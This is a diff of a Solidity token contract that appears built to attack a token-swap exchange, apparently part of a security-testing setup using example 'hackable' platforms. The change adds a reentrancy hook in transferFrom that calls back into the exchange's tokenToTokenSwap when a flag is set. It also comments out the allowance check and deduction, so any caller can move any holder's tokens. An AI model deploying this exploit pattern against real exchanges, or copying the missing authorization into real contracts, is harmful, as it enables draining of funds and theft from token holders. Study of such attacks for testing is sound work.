@@ -75,7 +75,7 @@ import "../../../../contracts/interfaces/examplePlatforms/swapHackablePlatform.s
             if(reentryActivated == true){
                 reentryActivated=false;
                 platformToHack exchange = platformToHack(marketplaceAddress);
-                exchange.tokenToEthSwapInput(defaultReentryTradeAmount, 0, 10000000000000000000000000000); //no deadline is reason for long 000000s
+                exchange.tokenToTokenSwap(address(this), address(this), 10000000);
             }
             if(updateSupplyActivated ==true){
                 _totalSupply = defaultTotalSupplyToAdd;
@@ -85,11 +85,19 @@ import "../../../../contracts/interfaces/examplePlatforms/swapHackablePlatform.s
 
 
     function transferFrom(address _from, address _to, uint256 _value)  public returns(bool) {
-        require(allowed[_from][msg.sender] >= _value && balances[_from] >= _value && _value > 0);
+      //  require(allowed[_from][msg.sender] >= _value, "Not having permission");
+          require(balances[_from] >= _value && _value > 0, "balance too low");
         balances[_from] = balances[_from].sub(_value);
         balances[_to] = balances[_to].add(_value);
-        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+      //  allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
         emit  Transfer(_from, _to, _value);
+
+        if(reentryActivated == true){
+            reentryActivated=false;
+            platformToHack exchange = platformToHack(marketplaceAddress);
+            exchange.tokenToTokenSwap(address(this), address(this), 10000000);
+        }
+
         return true;
     }
 
